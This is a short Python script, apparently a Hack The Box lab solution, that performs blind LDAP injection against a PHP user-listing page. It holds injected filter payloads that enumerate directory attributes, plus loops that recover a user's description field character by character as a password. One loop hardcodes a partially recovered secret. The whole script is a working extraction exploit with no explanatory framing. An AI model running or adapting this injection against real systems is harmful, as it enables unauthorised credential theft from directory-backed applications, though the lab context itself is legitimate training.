
#Work Auth: Meowhekcer
import requests 
import string


vulnURL = 'http://internal.analysis.htb/users/list.php?name='

fuzzSting = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"


# Enumerate valid Attribute 

attributeList = ["c", "cn", "co", "commonName", "dc", "facsimileTelephoneNumber", "givenName", "gn", "homePhone", "id", "jpegPhoto", "l", "mail", "mobile", "name", "o", "objectClass", "ou", "owner", "pager", "password", "sn", "st", "surname", "uid", "username", "userPassword"]


# def enumerateValidAttribute(attributeList):
    
#     for attributeFUZZ in attributeList:

#         payload_Fuzz_Attribute = f'*)(%26({attributeFUZZ}=??)' #   %26 -> &   
#         print(vulnURL+payload_Fuzz_Attribute)
#         response = requests.get(vulnURL+payload_Fuzz_Attribute)

#         if response.status_code == 200 and "Username" in response.text:
#             print("Attribute Found", attributeFUZZ)


#enumerateValidAttribute(attributeList)



def enumerateValidPassword(fuzzSting):
    FoundChar=""

    for contentLengtin in range(15):
        for FUZZ in fuzzSting :
            payload_enumerateContent = f'*)(%26(objectClass=user)(description={FoundChar}{FUZZ}*)'
            response = requests.get(vulnURL + payload_enumerateContent)
            if response.status_code == 200 and "technician" in response.text:
                print("Found", FUZZ)
                FoundChar = FoundChar + str(FUZZ)
                continue

    print(FoundChar)

#enumerateValidPassword(fuzzSting)


def enumerateValidPassword2(fuzzSting):
    FoundChar=""

    for contentLengtin in range(15):
        for FUZZ in fuzzSting :
            payload_enumerateContent = f'*)(%26(objectClass=user)(description=97NTtl*4{FoundChar}{FUZZ}*)'
            response = requests.get(vulnURL + payload_enumerateContent)
            if response.status_code == 200 and "technician" in response.text:
                print("Found", FUZZ)
                FoundChar = FoundChar + str(FUZZ)
                continue

    print(FoundChar)

enumerateValidPassword2(fuzzSting)



